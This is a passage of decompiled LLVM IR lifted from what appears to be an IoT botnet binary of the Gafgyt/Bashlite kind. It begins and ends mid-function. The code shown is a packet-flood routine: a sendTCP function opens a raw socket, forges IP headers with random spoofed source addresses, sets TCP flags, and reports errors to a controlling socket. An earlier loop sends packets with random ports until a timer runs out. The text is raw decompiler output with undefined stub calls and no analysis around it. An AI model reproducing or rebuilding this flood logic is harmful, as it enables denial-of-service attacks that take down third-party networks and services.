  %stack_var_-102.0 = phi i16 [ %storemerge, %dec_label_pc_804dee7 ], [ %stack_var_-102.0.ph, %dec_label_pc_804de2c.outer ]
  %stack_var_-84.0 = phi i32 [ 0, %dec_label_pc_804dee7 ], [ %stack_var_-84.0.ph, %dec_label_pc_804de2c.outer ]
  store i32 %v2_804daa2, i32* %eax.global-to-local, align 4
  store i32 %v2_804dd13, i32* %edx.global-to-local, align 4
  %v1_804de35 = add i32 %v0_804de32, -12
  %v2_804de35 = inttoptr i32 %v1_804de35 to i32*
  store i32 16, i32* %v2_804de35, align 4
  %v2_804de37 = add i32 %v0_804de32, -16
  %v3_804de37 = inttoptr i32 %v2_804de37 to i32*
  store i32 %v2_804daa2, i32* %v3_804de37, align 4
  %v1_804de38 = add i32 %v0_804de32, -20
  %v2_804de38 = inttoptr i32 %v1_804de38 to i32*
  store i32 0, i32* %v2_804de38, align 4
  %v5_804de3a = add i32 %v0_804de32, -24
  %v6_804de3a = inttoptr i32 %v5_804de3a to i32*
  store i32 %v1_804dcf3, i32* %v6_804de3a, align 4
  %v0_804de3d = load i32, i32* %edx.global-to-local, align 4
  %v2_804de3d = add i32 %v0_804de32, -28
  %v3_804de3d = inttoptr i32 %v2_804de3d to i32*
  store i32 %v0_804de3d, i32* %v3_804de3d, align 4
  %v5_804de3e = add i32 %v0_804de32, -32
  %v6_804de3e = inttoptr i32 %v5_804de3e to i32*
  store i32 %v4_804dc1f, i32* %v6_804de3e, align 4
  %v6_804de41 = call i32 @__libc_sendto(i32 %stack_var_-80.0.ph, i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32))
  store i32 %v6_804de41, i32* %eax.global-to-local, align 4
  %v1_804de49 = call i32 @rand_cmwc(i32 %stack_var_-80.0.ph)
  %sext3 = mul i32 %v1_804de49, 65536
  %v1_804de4e = sdiv i32 %sext3, 65536
  store i32 %v1_804de4e, i32* %edx.global-to-local, align 4
  store i32 %v1_804dd2b, i32* %eax.global-to-local, align 4
  %v1_804de53 = trunc i32 %v1_804de4e to i16
  store i16 %v1_804de53, i16* %v5_804dd2e, align 4
  br i1 %v1_804da7a, label %dec_label_pc_804de67, label %dec_label_pc_804de5c

dec_label_pc_804de5c:                             ; preds = %dec_label_pc_804de2c
  %v1_804de5c = call i32 @rand_cmwc(i32 %stack_var_-80.0.ph)
  br label %dec_label_pc_804de7f

dec_label_pc_804de67:                             ; preds = %dec_label_pc_804de2c
  store i32 %v1_804de6a.pre-phi, i32* %eax.global-to-local, align 4
  %v0_804de6f = load i32, i32* @esp, align 4
  %v2_804de72 = add i32 %v0_804de6f, -16
  %v3_804de72 = inttoptr i32 %v2_804de72 to i32*
  store i32 %v1_804de6a.pre-phi, i32* %v3_804de72, align 4
  %v1_804de73 = sext i16 %stack_var_-102.0 to i32
  %v2_804de73 = call i32 @htons(i32 %v1_804de73)
  br label %dec_label_pc_804de7f

dec_label_pc_804de7f:                             ; preds = %dec_label_pc_804de5c, %dec_label_pc_804de67
  %storemerge.in = phi i32 [ %v1_804de5c, %dec_label_pc_804de5c ], [ %v2_804de73, %dec_label_pc_804de67 ]
  %storemerge = trunc i32 %storemerge.in to i16
  store i32 %v1_804dd2b, i32* %eax.global-to-local, align 4
  %v4_804de82 = urem i32 %storemerge.in, 65536
  %v5_804de82 = load i32, i32* %edx.global-to-local, align 4
  %v6_804de82 = and i32 %v5_804de82, -65536
  %v7_804de82 = or i32 %v6_804de82, %v4_804de82
  store i32 %v7_804de82, i32* %edx.global-to-local, align 4
  store i16 %storemerge, i16* %v4_804ddc5, align 2
  %sext13 = mul i32 %storemerge.in, 65536
  %v1_804de8a = sdiv i32 %sext13, 65536
  %v2_804de8a = call i32 @rand_cmwc(i32 %v1_804de8a)
  %sext4 = mul i32 %v2_804de8a, 65536
  %v1_804de8f = sdiv i32 %sext4, 65536
  store i32 %v1_804de8f, i32* %edx.global-to-local, align 4
  store i32 %v2_804dd13, i32* %eax.global-to-local, align 4
  %v1_804de94 = trunc i32 %v1_804de8f to i16
  store i16 %v1_804de94, i16* %v4_804de94, align 4
  %v0_804de98 = load i32, i32* @esp, align 4
  %v5_804de9b = add i32 %v0_804de98, -16
  %v6_804de9b = inttoptr i32 %v5_804de9b to i32*
  store i32 %storemerge6, i32* %v6_804de9b, align 4
  %v3_804de9e = call i32 @GetRandomIP(i32 %v1_804de8a, i32 ptrtoint (i32* @0 to i32))
  store i32 %v3_804de9e, i32* %eax.global-to-local, align 4
  %v0_804dea3 = load i32, i32* @esp, align 4
  %v3_804dea9 = inttoptr i32 %v0_804dea3 to i32*
  store i32 %v3_804de9e, i32* %v3_804dea9, align 4
  %v0_804deaa = call i32 @htonl()
  store i32 %v0_804deaa, i32* %edx.global-to-local, align 4
  store i32 %v0_804deaa, i32* %v3_804deb7, align 4
  store i32 %v2_804dd13, i32* %eax.global-to-local, align 4
  %v3_804debd = load i16, i16* %v2_804dde7, align 2
  %v4_804debd = zext i16 %v3_804debd to i32
  store i32 %v4_804debd, i32* %edx.global-to-local, align 4
  store i32 %v2_804dd13, i32* %eax.global-to-local, align 4
  %v1_804decc = load i32, i32* @esp, align 4
  %v2_804decc = add i32 %v1_804decc, -4
  %v3_804decc = inttoptr i32 %v2_804decc to i32*
  store i32 %v4_804debd, i32* %v3_804decc, align 4
  %v0_804decd = load i32, i32* %eax.global-to-local, align 4
  %v2_804decd = add i32 %v1_804decc, -8
  %v3_804decd = inttoptr i32 %v2_804decd to i32*
  store i32 %v0_804decd, i32* %v3_804decd, align 4
  %v3_804dece = inttoptr i32 %v1_804de8a to i16*
  %v4_804dece = call i32 @csum(i16* %v3_804dece, i32 ptrtoint (i32* @0 to i32))
  %v5_804dece = trunc i32 %v4_804dece to i16
  %sext16 = mul i32 %v4_804dece, 65536
  %v1_804ded6 = sdiv i32 %sext16, 65536
  store i32 %v1_804ded6, i32* %edx.global-to-local, align 4
  store i16 %v5_804dece, i16* %v4_804de05, align 2
  store i32 %arg6, i32* %eax.global-to-local, align 4
  %v15_804dee2 = icmp eq i32 %stack_var_-84.0, %arg6
  %v1_804dee5 = icmp eq i1 %v15_804dee2, false
  br i1 %v1_804dee5, label %dec_label_pc_804df05, label %dec_label_pc_804dee7

dec_label_pc_804dee7:                             ; preds = %dec_label_pc_804de7f
  %v0_804dee7 = load i32, i32* @esp, align 4
  %v1_804deea = add i32 %v0_804dee7, -16
  %v2_804deea = inttoptr i32 %v1_804deea to i32*
  store i32 0, i32* %v2_804deea, align 4
  %v2_804deec = inttoptr i32 %v1_804de8a to i32*
  %v3_804deec = call i32 @__GI_time(i32* %v2_804deec)
  store i32 %v3_804deec, i32* %eax.global-to-local, align 4
  %v0_804def1 = load i32, i32* @esp, align 4
  %v1_804def1 = add i32 %v0_804def1, 16
  %v8_804def7 = icmp sgt i32 %v3_804deec, %v5_804de16
  br i1 %v8_804def7, label %dec_label_pc_804df4f, label %dec_label_pc_804de2c

dec_label_pc_804df05:                             ; preds = %dec_label_pc_804de7f
  %v4_804df05 = add i32 %stack_var_-84.0, 1
  store i32 %arg7, i32* %eax.global-to-local, align 4
  %v15_804df0b = icmp eq i32 %stack_var_-80.0.ph, %arg7
  %v1_804df0e = icmp eq i1 %v15_804df0b, false
  br i1 %v1_804df0e, label %dec_label_pc_804df47, label %dec_label_pc_804df10

dec_label_pc_804df10:                             ; preds = %dec_label_pc_804df05
  store i32 %v1_804df23, i32* %edx.global-to-local, align 4
  store i32 %v2_804df2c, i32* %eax.global-to-local, align 4
  %v0_804df2f = load i32, i32* @esp, align 4
  %v2_804df32 = add i32 %v0_804df2f, -16
  %v3_804df32 = inttoptr i32 %v2_804df32 to i32*
  store i32 %v2_804df2c, i32* %v3_804df32, align 4
  %v1_804df33 = sext i32 %v4_804df05 to i64
  %v2_804df33 = call i32 @usleep(i64 %v1_804df33)
  store i32 %v2_804df33, i32* %eax.global-to-local, align 4
  %v0_804df38 = load i32, i32* @esp, align 4
  %v1_804df38 = add i32 %v0_804df38, 16
  br label %dec_label_pc_804de2c.outer

dec_label_pc_804df47:                             ; preds = %dec_label_pc_804df05
  %v4_804df47 = add i32 %stack_var_-80.0.ph, 1
  %v0_804de32.pre.pre.pre = load i32, i32* @esp, align 4
  br label %dec_label_pc_804de2c.outer

dec_label_pc_804df4f:                             ; preds = %dec_label_pc_804dee7, %dec_label_pc_804dc6e, %dec_label_pc_804dc30
  %v0_804df5833 = phi i32 [ %v3_804dc7c, %dec_label_pc_804dc6e ], [ %v3_804dc3e, %dec_label_pc_804dc30 ], [ %v3_804deec, %dec_label_pc_804dee7 ]
  br label %dec_label_pc_804df52

dec_label_pc_804df52:                             ; preds = %dec_label_pc_804dba8, %dec_label_pc_804db14, %dec_label_pc_804da9f, %dec_label_pc_804daf9, %dec_label_pc_804df4f
  %v0_804df58 = phi i32 [ 0, %dec_label_pc_804db14 ], [ %v4_804daac, %dec_label_pc_804da9f ], [ %v3_804db07, %dec_label_pc_804daf9 ], [ %v0_804df5833, %dec_label_pc_804df4f ], [ %v2_804dbad, %dec_label_pc_804dba8 ]
  store i32 %v0_804da6c, i32* @ebx, align 4
  ret i32 %v0_804df58

; uselistorder directives
  uselistorder i32 %v4_804df05, { 2, 1, 0 }
  uselistorder i32 %v0_804deaa, { 1, 0 }
  uselistorder i32 %v1_804de8f, { 1, 0 }
  uselistorder i32 %v1_804de8a, { 3, 2, 1, 0 }
  uselistorder i16 %storemerge, { 3, 1, 0, 2 }
  uselistorder i32 %v1_804de4e, { 1, 0 }
  uselistorder i32 %v0_804de32, { 5, 4, 3, 2, 1, 0 }
  uselistorder i32 %stack_var_-80.0.ph, { 3, 0, 4, 2, 1 }
  uselistorder i32 %v0_804dde1, { 1, 0 }
  uselistorder i32 %v4_804ddc2, { 3, 2, 1, 0 }
  uselistorder i32 %v1_804de6a.pre-phi, { 1, 0 }
  uselistorder i32 %v1_804ddaa, { 2, 1, 0 }
  uselistorder i32 %v1_804dd8e, { 1, 0 }
  uselistorder i32 %v1_804dd6f, { 1, 0 }
  uselistorder i32 %v2_804dd13, { 9, 8, 7, 6, 17, 16, 15, 5, 4, 14, 3, 13, 12, 11, 10, 2, 1, 0 }
  uselistorder i32 %v2_804dce9, { 1, 0 }
  uselistorder i32 %v4_804dc1f, { 0, 2, 1, 3, 4 }
  uselistorder i32 %v4_804dbc7, { 1, 0 }
  uselistorder i32 %stack_var_-88.0.ph, { 1, 0 }
  uselistorder i32 %v2_804dbee, { 1, 0 }
  uselistorder i32 %v1_804db1c, { 4, 3, 1, 2, 0, 5 }
  uselistorder i32 %v1_804db17, { 2, 1, 0, 3 }
  uselistorder i32 %v4_804dae8, { 1, 0, 2, 3 }
  uselistorder i32 %v2_804daa2, { 2, 3, 0, 1 }
  uselistorder i32 %v1_804da8a, { 1, 0 }
  uselistorder i32 %v12_804da6d, { 1, 2, 0, 3 }
  uselistorder i32* %stack_var_-68, { 1, 0 }
  uselistorder i32* %stack_var_-64, { 1, 0, 2 }
  uselistorder i32* %stack_var_-156, { 1, 0, 2 }
  uselistorder i32* %stack_var_-72, { 1, 0 }
  uselistorder i32* %edx.global-to-local, { 0, 1, 2, 3, 5, 4, 6, 7, 8, 9, 10, 11, 12, 14, 13, 15, 16, 17, 18, 19, 20 }
  uselistorder i32 %arg7, { 0, 3, 1, 2 }
  uselistorder i32 %arg6, { 0, 3, 1, 2, 4 }
  uselistorder i32 %arg5, { 7, 6, 5, 4, 0, 3, 1, 2 }
  uselistorder i32 %arg4, { 2, 1, 0 }
  uselistorder label %dec_label_pc_804df52, { 4, 0, 1, 3, 2 }
  uselistorder label %dec_label_pc_804de7f, { 1, 0 }
  uselistorder label %dec_label_pc_804de2c, { 1, 0 }
  uselistorder label %dec_label_pc_804de2c.outer, { 1, 0, 2 }
  uselistorder label %dec_label_pc_804ddbf, { 1, 0 }
  uselistorder label %dec_label_pc_804dcf0, { 1, 0 }
  uselistorder label %bb84, { 1, 0 }
  uselistorder label %dec_label_pc_804dc92, { 1, 0 }
  uselistorder label %dec_label_pc_804dba8, { 1, 0 }
  uselistorder label %dec_label_pc_804db74, { 1, 0 }
  uselistorder label %dec_label_pc_804db74.outer, { 1, 0, 2 }
  uselistorder label %dec_label_pc_804da9f, { 1, 0 }
}

define i32 @sendTCP(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i8* %arg5, i32 %arg6, i32 %arg7) local_unnamed_addr {
entry:
  %cf.global-to-local = alloca i1, align 1
  %eax.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %tmp47 = call i16 @__decompiler_undefined_function_5()
  %tmp48 = call i32 @__decompiler_undefined_function_0()
  %tmp49 = call i8* @__decompiler_undefined_function_2()
  %stack_var_-20 = alloca i8*, align 4
  %stack_var_-64 = alloca i32, align 4
  %stack_var_-52 = alloca i32, align 4
  %stack_var_-56 = alloca i32, align 4
  %stack_var_-60 = alloca i32, align 4
  %stack_var_-172 = alloca i32, align 4
  %v0_804df5d = load i32, i32* @esi, align 4
  %v0_804df5e = load i32, i32* @ebx, align 4
  %v15_804df5f = ptrtoint i32* %stack_var_-172 to i32
  store i32 %arg7, i32* %eax.global-to-local, align 4
  store i32 2, i32* %stack_var_-60, align 4
  store i1 false, i1* %cf.global-to-local, align 1
  %v4_804df76 = icmp eq i32 %arg2, 0
  %v1_804df7a = icmp eq i1 %v4_804df76, false
  br i1 %v1_804df7a, label %dec_label_pc_804df87, label %dec_label_pc_804df7c

dec_label_pc_804df7c:                             ; preds = %entry
  %v1_804df7c = call i32 @rand_cmwc(i32 %v15_804df5f)
  store i32 %v1_804df7c, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804df9f

dec_label_pc_804df87:                             ; preds = %entry
  %v1_804df8a = urem i32 %arg2, 65536
  store i32 %v1_804df8a, i32* %eax.global-to-local, align 4
  %v5_804df8f = icmp ult i32* %stack_var_-172, inttoptr (i32 12 to i32*)
  store i1 %v5_804df8f, i1* %cf.global-to-local, align 1
  %v1_804df93 = call i32 @htons(i32 %v1_804df8a)
  store i32 %v1_804df93, i32* %eax.global-to-local, align 4
  %v0_804df98 = load i32, i32* @esp, align 4
  %v2_804df98 = icmp ugt i32 %v0_804df98, -17
  store i1 %v2_804df98, i1* %cf.global-to-local, align 1
  br label %dec_label_pc_804df9f

dec_label_pc_804df9f:                             ; preds = %dec_label_pc_804df7c, %dec_label_pc_804df87
  %v2_804dfa2 = ptrtoint i32* %stack_var_-60 to i32
  %v5_804dfa5 = icmp eq i32* %stack_var_-60, inttoptr (i32 -4 to i32*)
  store i1 %v5_804dfa5, i1* %cf.global-to-local, align 1
  %v15_804dfa5 = ptrtoint i32* %stack_var_-56 to i32
  store i32 %v15_804dfa5, i32* %eax.global-to-local, align 4
  %v4_804dfac = call i32 @getHost(i32 %arg1, i32* nonnull %stack_var_-56)
  store i32 %v4_804dfac, i32* %eax.global-to-local, align 4
  store i1 false, i1* %cf.global-to-local, align 1
  %v1_804dfb4 = icmp eq i32 %v4_804dfac, 0
  br i1 %v1_804dfb4, label %dec_label_pc_804dfbd, label %dec_label_pc_804e4e0

dec_label_pc_804dfbd:                             ; preds = %dec_label_pc_804df9f
  %v15_804dfc0 = ptrtoint i32* %stack_var_-52 to i32
  store i32 %v15_804dfc0, i32* %eax.global-to-local, align 4
  store i32 0, i32* %stack_var_-52, align 4
  %v5_804dfd0 = icmp ult i32* %stack_var_-172, inttoptr (i32 4 to i32*)
  store i1 %v5_804dfd0, i1* %cf.global-to-local, align 1
  %v4_804dfd9 = call i32 @socket(i32 2, i32 3, i32 6)
  store i32 %v4_804dfd9, i32* %eax.global-to-local, align 4
  store i1 false, i1* %cf.global-to-local, align 1
  %v4_804dfe4 = icmp eq i32 %v4_804dfd9, 0
  %v1_804dfe8 = icmp eq i1 %v4_804dfe4, false
  br i1 %v1_804dfe8, label %dec_label_pc_804e005, label %dec_label_pc_804dfea

dec_label_pc_804dfea:                             ; preds = %dec_label_pc_804dfbd
  %v0_804dfea = load i32, i32* @global_var_805b520.20, align 32
  store i32 %v0_804dfea, i32* %eax.global-to-local, align 4
  %v5_804dfef = icmp ult i32* %stack_var_-172, inttoptr (i32 8 to i32*)
  store i1 %v5_804dfef, i1* %cf.global-to-local, align 1
  %v3_804dff8 = call i32 @sockprintf(i32 %v0_804dfea, i32 ptrtoint ([27 x i8]* @global_var_8058bd0.303 to i32))
  store i32 %v3_804dff8, i32* %eax.global-to-local, align 4
  %v0_804dffd = load i32, i32* @esp, align 4
  %v2_804dffd = icmp ugt i32 %v0_804dffd, -17
  store i1 %v2_804dffd, i1* %cf.global-to-local, align 1
  br label %dec_label_pc_804e4e0

dec_label_pc_804e005:                             ; preds = %dec_label_pc_804dfbd
  store i32 1, i32* %stack_var_-64, align 4
  %v5_804e00c = icmp ult i32* %stack_var_-172, inttoptr (i32 12 to i32*)
  store i1 %v5_804e00c, i1* %cf.global-to-local, align 1
  %v2_804e011 = ptrtoint i32* %stack_var_-64 to i32
  store i32 %v2_804e011, i32* %eax.global-to-local, align 4
  %v5_804e01c = call i32 @__GI_setsockopt(i32 %v4_804dfd9, i32 0, i32 3, i32 %v2_804e011, i32 4)
  store i32 %v5_804e01c, i32* %eax.global-to-local, align 4
  store i1 false, i1* %cf.global-to-local, align 1
  %v2_804e024 = icmp slt i32 %v5_804e01c, 0
  %v1_804e026 = icmp eq i1 %v2_804e024, false
  br i1 %v1_804e026, label %dec_label_pc_804e043, label %dec_label_pc_804e028

dec_label_pc_804e028:                             ; preds = %dec_label_pc_804e005
  %v0_804e028 = load i32, i32* @global_var_805b520.20, align 32
  store i32 %v0_804e028, i32* %eax.global-to-local, align 4
  %v5_804e02d = icmp ult i32* %stack_var_-172, inttoptr (i32 8 to i32*)
  store i1 %v5_804e02d, i1* %cf.global-to-local, align 1
  %v3_804e036 = call i32 @sockprintf(i32 %v0_804e028, i32 ptrtoint ([33 x i8]* @global_var_8058bec.304 to i32))
  store i32 %v3_804e036, i32* %eax.global-to-local, align 4
  %v0_804e03b = load i32, i32* @esp, align 4
  %v2_804e03b = icmp ugt i32 %v0_804e03b, -17
  store i1 %v2_804e03b, i1* %cf.global-to-local, align 1
  br label %dec_label_pc_804e4e0

dec_label_pc_804e043:                             ; preds = %dec_label_pc_804e005
  store i1 false, i1* %cf.global-to-local, align 1
  %v4_804e043 = icmp eq i32 %arg4, 0
  %v1_804e047 = icmp eq i1 %v4_804e043, false
  br i1 %v1_804e047, label %dec_label_pc_804e052, label %dec_label_pc_804e068

dec_label_pc_804e052:                             ; preds = %dec_label_pc_804e043
  %v5_804e059 = sub i32 32, %arg4
  %v10_804e059 = icmp ugt i32 %arg4, 32
  store i1 %v10_804e059, i1* %cf.global-to-local, align 1
  store i32 1, i32* %eax.global-to-local, align 4
  %v2_804e061 = urem i32 %v5_804e059, 32
  %v4_804e061 = icmp eq i32 %v2_804e061, 0
  br i1 %v4_804e061, label %bb102, label %bb

bb:                                               ; preds = %dec_label_pc_804e052
  %v5_804e061 = shl i32 1, %v2_804e061
  store i32 %v5_804e061, i32* %eax.global-to-local, align 4
  store i1 false, i1* %cf.global-to-local, align 1
  br label %bb102

bb102:                                            ; preds = %dec_label_pc_804e052, %bb
  %v0_804e063 = phi i32 [ 1, %dec_label_pc_804e052 ], [ %v5_804e061, %bb ]
  %v1_804e063 = sub i32 0, %v0_804e063
  store i1 true, i1* %cf.global-to-local, align 1
  store i32 %v1_804e063, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804e068

dec_label_pc_804e068:                             ; preds = %dec_label_pc_804e043, %bb102
  %storemerge12 = phi i32 [ %v1_804e063, %bb102 ], [ 0, %dec_label_pc_804e043 ]
  %v1_804e06b = add i32 %arg6, 40
  %v1_804e077 = add i32 %arg6, 70
  %v2_804e07a = and i32 %v1_804e077, -16
  %v2_804e080 = sub i32 %v15_804df5f, %v2_804e07a
  %v1_804e088 = add i32 %v2_804e080, 15
  %v2_804e08b = and i32 %v1_804e088, -16
  store i32 %v2_804e08b, i32* %edx.global-to-local, align 4
  %v1_804e0a3 = add i32 %v2_804e08b, 20
  %v5_804e0a6 = inttoptr i32 %v1_804e0a3 to i16*
  %v1_804e0ac = add i32 %arg6, 20
  store i32 %v1_804e0ac, i32* %eax.global-to-local, align 4
  store i32 %v1_804e0ac, i32* @ebx, align 4
  %v5_804e0b1 = icmp ult i32 %v2_804e080, 12
  store i1 %v5_804e0b1, i1* %cf.global-to-local, align 1
  %v5_804e0b4 = add i32 %v2_804e080, -16
  %v6_804e0b4 = inttoptr i32 %v5_804e0b4 to i32*
  store i32 %storemerge12, i32* %v6_804e0b4, align 4
  %v2_804e0b7 = call i32 @GetRandomIP(i32 %v1_804e06b, i32 %v2_804e08b)
  store i32 %v2_804e0b7, i32* %eax.global-to-local, align 4
  %v0_804e0bc = load i32, i32* @esp, align 4
  %v1_804e0bc = add i32 %v0_804e0bc, 16
  %v5_804e0bf = icmp ult i32 %v1_804e0bc, 12
  store i1 %v5_804e0bf, i1* %cf.global-to-local, align 1
  %v3_804e0c2 = inttoptr i32 %v0_804e0bc to i32*
  store i32 %v2_804e0b7, i32* %v3_804e0c2, align 4
  %v0_804e0c3 = call i32 @htonl()
  store i32 %v0_804e0c3, i32* %eax.global-to-local, align 4
  %v0_804e0c8 = load i32, i32* @esp, align 4
  %v3_804e0cb = load i32, i32* %stack_var_-56, align 4
  store i32 %v3_804e0cb, i32* %edx.global-to-local, align 4
  %tmp105 = and i32 %v0_804e0c8, -4
  %v5_804e0ce = icmp eq i32 %tmp105, -16
  store i1 %v5_804e0ce, i1* %cf.global-to-local, align 1
  %v0_804e0d1 = load i32, i32* @ebx, align 4
  %v2_804e0d1 = add i32 %v0_804e0c8, 8
  %v3_804e0d1 = inttoptr i32 %v2_804e0d1 to i32*
  store i32 %v0_804e0d1, i32* %v3_804e0d1, align 4
  %v1_804e0d2 = add i32 %v0_804e0c8, 4
  %v2_804e0d2 = inttoptr i32 %v1_804e0d2 to i32*
  store i32 6, i32* %v2_804e0d2, align 4
  %v3_804e0d4 = inttoptr i32 %v0_804e0c8 to i32*
  store i32 %v0_804e0c3, i32* %v3_804e0d4, align 4
  %v0_804e0d5 = load i32, i32* %edx.global-to-local, align 4
  %v2_804e0d5 = add i32 %v0_804e0c8, -4
  %v3_804e0d5 = inttoptr i32 %v2_804e0d5 to i32*
  store i32 %v0_804e0d5, i32* %v3_804e0d5, align 4
  %v5_804e0d6 = add i32 %v0_804e0c8, -8
  %v6_804e0d6 = inttoptr i32 %v5_804e0d6 to i32*
  store i32 %v2_804e08b, i32* %v6_804e0d6, align 4
  %v0_804e0d9 = call i32 @makeIPPacket()
  store i32 %v0_804e0d9, i32* %eax.global-to-local, align 4
  %v0_804e0de = load i32, i32* @esp, align 4
  %v5_804e0de = icmp ugt i32 %v0_804e0de, -25
  store i1 %v5_804e0de, i1* %cf.global-to-local, align 1
  %v2_804e0e1 = call i32 @rand_cmwc(i32 %v1_804e0a3)
  %sext = mul i32 %v2_804e0e1, 65536
  %v1_804e0e6 = sdiv i32 %sext, 65536
  store i32 %v1_804e0e6, i32* %edx.global-to-local, align 4
  store i32 %v1_804e0a3, i32* %eax.global-to-local, align 4
  %v1_804e0eb = trunc i32 %v1_804e0e6 to i16
  store i16 %v1_804e0eb, i16* %v5_804e0a6, align 4
  %v2_804e0ee = call i32 @rand_cmwc(i32 %v1_804e0a3)
  %v2_804e0f8 = add i32 %v2_804e08b, 24
  %v3_804e0f8 = inttoptr i32 %v2_804e0f8 to i32*
  store i32 %v2_804e0ee, i32* %v3_804e0f8, align 8
  store i32 %v1_804e0a3, i32* %eax.global-to-local, align 4
  %v1_804e0fe = add i32 %v2_804e08b, 28
  %v2_804e0fe = inttoptr i32 %v1_804e0fe to i32*
  store i32 0, i32* %v2_804e0fe, align 4
  store i32 %v1_804e0a3, i32* %edx.global-to-local, align 4
  %v1_804e108 = add i32 %v2_804e08b, 32
  %v2_804e108 = inttoptr i32 %v1_804e108 to i8*
  %v3_804e108 = load i8, i8* %v2_804e108, align 16
  %v1_804e10b = urem i8 %v3_804e108, 16
  %v1_804e10e = or i8 %v1_804e10b, 80
  store i1 false, i1* %cf.global-to-local, align 1
  store i8 %v1_804e10e, i8* %v2_804e108, align 16
  %v4_804e114 = ptrtoint i8* %arg5 to i32
  store i32 %v4_804e114, i32* %eax.global-to-local, align 4
  store i1 false, i1* @df, align 1
  store i32 %v4_804e114, i32* @esi, align 4
  store i32 ptrtoint ([4 x i8]* @global_var_8058c0d.305 to i32), i32* @edi, align 4
  %v6_804e132 = call i32 @_strncmp(i8* %arg5, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_8058c0d.305, i32 0, i32 0), i32 4)
  %v7_804e132 = urem i32 %v6_804e132, 2
  %v8_804e132 = icmp eq i32 %v7_804e132, 0
  %v0_804e134 = load i1, i1* %cf.global-to-local, align 1
  %v2_804e134 = or i1 %v0_804e134, %v8_804e132
  %v3_804e134 = zext i1 %v2_804e134 to i32
  %v4_804e134 = load i32, i32* %edx.global-to-local, align 4
  %v5_804e134 = and i32 %v4_804e134, -256
  %v6_804e134 = or i32 %v3_804e134, %v5_804e134
  %v7_804e134 = xor i32 %v6_804e134, 1
  store i32 %v7_804e134, i32* @edx, align 4
  %v3_804e13a = and i32 %v6_804e132, -256
  %v1_804e13c = trunc i32 %v7_804e134 to i8
  %v3_804e13c = zext i1 %v0_804e134 to i8
  %v4_804e13c = sub nsw i8 %v1_804e13c, %v3_804e13c
  %v15_804e13c = icmp eq i8 %v4_804e13c, 0
  %v20_804e13c = zext i8 %v4_804e13c to i32
  %v23_804e13c = or i32 %v20_804e13c, %v3_804e13a
  store i32 %v23_804e13c, i32* @ecx, align 4
  %v2_804e140 = sext i8 %v4_804e13c to i32
  store i32 %v2_804e140, i32* %eax.global-to-local, align 4
  store i1 false, i1* %cf.global-to-local, align 1
  %v1_804e145 = icmp eq i1 %v15_804e13c, false
  br i1 %v1_804e145, label %dec_label_pc_804e188, label %dec_label_pc_804e147

dec_label_pc_804e147:                             ; preds = %dec_label_pc_804e068
  store i32 %v1_804e0a3, i32* %edx.global-to-local, align 4
  %v1_804e14a = add i32 %v2_804e08b, 33
  %v2_804e14a = inttoptr i32 %v1_804e14a to i8*
  %v3_804e14a = load i8, i8* %v2_804e14a, align 1
  %v4_804e14a = zext i8 %v3_804e14a to i32
  %v6_804e14a = and i32 %v2_804e140, -256
  %v7_804e14a = or i32 %v6_804e14a, %v4_804e14a
  %v1_804e14d = or i32 %v7_804e14a, 2
  store i1 false, i1* %cf.global-to-local, align 1
  %v3_804e14d = trunc i32 %v1_804e14d to i8
  store i32 %v1_804e14d, i32* %eax.global-to-local, align 4
  store i8 %v3_804e14d, i8* %v2_804e14a, align 1
  store i32 %v1_804e0a3, i32* %edx.global-to-local, align 4
  %v3_804e156 = load i8, i8* %v2_804e14a, align 1
  %v4_804e156 = zext i8 %v3_804e156 to i32
  %v5_804e156 = load i32, i32* %eax.global-to-local, align 4
  %v6_804e156 = and i32 %v5_804e156, -256
  %v7_804e156 = or i32 %v4_804e156, %v6_804e156
  %v1_804e159 = or i32 %v7_804e156, 4
  store i1 false, i1* %cf.global-to-local, align 1
  %v3_804e159 = trunc i32 %v1_804e159 to i8
  store i32 %v1_804e159, i32* %eax.global-to-local, align 4
  store i8 %v3_804e159, i8* %v2_804e14a, align 1
  store i32 %v1_804e0a3, i32* %edx.global-to-local, align 4
  %v3_804e162 = load i8, i8* %v2_804e14a, align 1
  %v4_804e162 = zext i8 %v3_804e162 to i32
  %v5_804e162 = load i32, i32* %eax.global-to-local, align 4
  %v6_804e162 = and i32 %v5_804e162, -256
  %v7_804e162 = or i32 %v4_804e162, %v6_804e162
  %v1_804e165 = or i32 %v7_804e162, 1
  store i1 false, i1* %cf.global-to-local, align 1
  %v3_804e165 = trunc i32 %v1_804e165 to i8
  store i32 %v1_804e165, i32* %eax.global-to-local, align 4
  store i8 %v3_804e165, i8* %v2_804e14a, align 1
  store i32 %v1_804e0a3, i32* %edx.global-to-local, align 4
  %v3_804e16e = load i8, i8* %v2_804e14a, align 1
  %v4_804e16e = zext i8 %v3_804e16e to i32
  %v5_804e16e = load i32, i32* %eax.global-to-local, align 4
  %v6_804e16e = and i32 %v5_804e16e, -256
  %v7_804e16e = or i32 %v4_804e16e, %v6_804e16e
  %v1_804e171 = or i32 %v7_804e16e, 16
  store i1 false, i1* %cf.global-to-local, align 1
  %v3_804e171 = trunc i32 %v1_804e171 to i8
  store i32 %v1_804e171, i32* %eax.global-to-local, align 4
  store i8 %v3_804e171, i8* %v2_804e14a, align 1
  store i32 %v1_804e0a3, i32* %edx.global-to-local, align 4
  %v3_804e17a = load i8, i8* %v2_804e14a, align 1
  %v4_804e17a = zext i8 %v3_804e17a to i32
  %v5_804e17a = load i32, i32* %eax.global-to-local, align 4
  %v6_804e17a = and i32 %v5_804e17a, -256
  %v7_804e17a = or i32 %v4_804e17a, %v6_804e17a
  %v1_804e17d = or i32 %v7_804e17a, 8
  store i1 false, i1* %cf.global-to-local, align 1
  %v3_804e17d = trunc i32 %v1_804e17d to i8
  store i32 %v1_804e17d, i32* %eax.global-to-local, align 4
  store i8 %v3_804e17d, i8* %v2_804e14a, align 1
  %v0_804e354.pre = load i8*, i8** %stack_var_-20, align 4
  br label %dec_label_pc_804e354

dec_label_pc_804e188:                             ; preds = %dec_label_pc_804e068
  store i32 %v4_804e114, i32* @eax, align 4
  %v0_804e18b = load i32, i32* @esp, align 4
  %v5_804e18b = icmp ult i32 %v0_804e18b, 8
